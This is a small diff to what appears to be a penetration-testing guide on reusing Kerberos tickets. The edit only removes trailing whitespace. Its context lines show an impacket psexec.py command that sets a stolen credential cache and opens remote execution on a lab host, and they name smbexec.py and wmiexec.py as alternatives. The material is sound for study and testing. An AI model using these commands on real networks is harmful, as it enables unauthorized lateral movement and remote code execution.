@@ -12,7 +12,7 @@ export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
 python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 ```
 
-You can **specify** `-aesKey [AES key]` to specify to use **AES256**.   
+You can **specify** `-aesKey [AES key]` to specify to use **AES256**.  
 You can also use the ticket with other tools like: as smbexec.py or wmiexec.py
 
 Possible problems:
